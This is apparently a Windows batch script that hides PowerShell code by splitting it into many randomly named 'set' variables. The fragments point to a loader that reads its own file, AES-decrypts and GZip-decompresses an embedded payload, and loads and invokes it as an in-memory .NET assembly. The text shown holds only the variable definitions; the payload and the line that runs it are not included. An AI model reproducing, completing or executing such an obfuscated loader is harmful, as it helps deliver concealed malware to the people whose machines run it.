@echo off
set "uvrcAEqJZz=Ul ="
set "VaWPpgjmBE=oin "
set "PrCelQGDqs=('%*'"
set "PzrNyNDoFB=Cnaf"
set "lyMBUIyEVi=]::N"
set "qRfWmktkDC=tem."
set "kHnawolbxh=comm"
set "TVVMmyrTAt=orF'"
set "QiRwCrquah=$YSq"
set "ZngdvIfLzK=New-"
set "LEqgIlfSEm=yTo("
set "ANWGiYgDdC=Disp"
set "pSSHHLMyMu=]::("
set "dGNGHHXPNr=pres"
set "btobMgbrrn=.IO."
set "FuexYdAfIt=.Dis"
set "ssfFMVOExd=Iwa "
set "BaNtbyeAMN=am;$"
set "syRvagZJTg=, (,"
set "AReBaZNYSy=ress"
set "WqvWPNEOwx=$oiA"
set "fIDUfENuYe= = $"
set "oPjVIcIsuc=t Sy"
set "fIygSOKMwg=rity"
set "pPmqGMWAoM=-Obj"
set "UHsTEFztmx=; };"
set "hRzLtjpBIr=);$C"
set "qbjzOhwNyz=sg.I"
set "nOVSGmrrvk=k; }"
set "WOaQKrULpW=rans"
set "YiJNVJeKKO=.Ass"
set "jLwLPJwoVl=y.Ci"
set "bUsQCbUTum=e = "
set "LmIJLAfUnV=y.Cr"
set "YqAwtsVytA=rtS4"
set "VZrFKVgHqz=gMod"
set "TzUvCrJQRJ=Iwa."
set "KBZfTliPzt=nirt"
set "ozMlYQRXMF=wCz "
set "ruXLpmuzSW=ring"
set "vZobHzzbgi='')("
set "ccNrYzODLH=bjec"
set "KuLlXFoRQf=pose"
set "uthcpSqfzp=ne);"
set "BwzFAFPquJ=();$"
set "qwwWopZWjI=Star"
set "EduykRTfgG=);$z"
set "FQudAyvcrQ=$oiA"
set "XgocZoOkmC=J = "
set "RbPaiMRloZ=yste"
set "CfLaxWQdpt=);$P"
set "ZkMSTkaeCZ=ck($"
set "YPwUaiHUDE=oint"
set "kjYigOonBX=sGUc"
set "gttIaAyWZZ=[Sys"
set "YJxbnuLhpm== $z"
set "cEDYwLmdlm=comp"
set "PnflBavCrR=1..-"
set "VqcjKKntzw=lBlo"
set "dxLsKbvUkp=]::("
set "IKqRWGhZnQ=ptog"
set "wpuQitDJER=3HWs"
set "AVaZtSsbbF=736u"
set "DvSskHPxvn=ress"
set "vdRDpYAffN=)))"
set "VOQBYtzGTN=esFX"
set "iLvRxHrkNG=eam("
set "HJHszLZRLX=..-1"
set "LMRzjZSlFC=join"
set "LhgckXWkeg='[-1"
set "rZuUToijXW=nL.T"
set "hGhrVZMrAg=hy.A"
set "TcpCiFNOym=)($o"
set "AiKisQRcrV=dcDr"
set "GWYAeDeKCQ=m(, "
set "EonFbMyirM=Fina"
set "xuqOslCcXP=.Mod"
set "idmnwaNQDd=rofi"
set "FyWcYzGooL= if "
set "EQjtAOZPIG=('%~f0'"
set "yGkOhKBmvW=onve"
set "pzmtvkeHGf=Secu"
set "uiBSNLYqrm=-4] "
set "ipLQnWgGja=g = "
set "sHWOfQfVcU=in $"
set "ZNvUtDaJbP=;$CX"
set "LExkmmtYxk=).Sp"
set "WEIgNyJPhu= [Sy"
set "NvHrnvtXxT=($wo"
set "MTdkbdAZgG=w = "
set "CMBQzjUzUl=ct S"
set "LcgTpdlWig=[Env"
set "HvBIXEHCPE=CXUf"
set "eYaxnDblUt=sion"
set "NrSmngFbKf=vj0m"
set "oomxqAOIWc=ert]"
set "sLSwRQkNlY=.Cre"
set "LsawRlABGI=stem"
set "bSvGogBOWX=pDZz"
set "NpGmYKnQDK=oL'["
set "EVDqtXgIRz=New-"
set "EsComZnEfE=Invo"
set "oiYxZYCVBw=YJ, "
set "ILqsFztPRq=.GZi"
set "QsqGsIAvPX=oiAq"
set "uIcEdtPjdh=cDr."
set "NYBCJXqaYV=File"
set "nRNkqMPweQ=tion"
set "AghTVehDqd=ose("
set "zCXggtFRZJ=;$Pd"
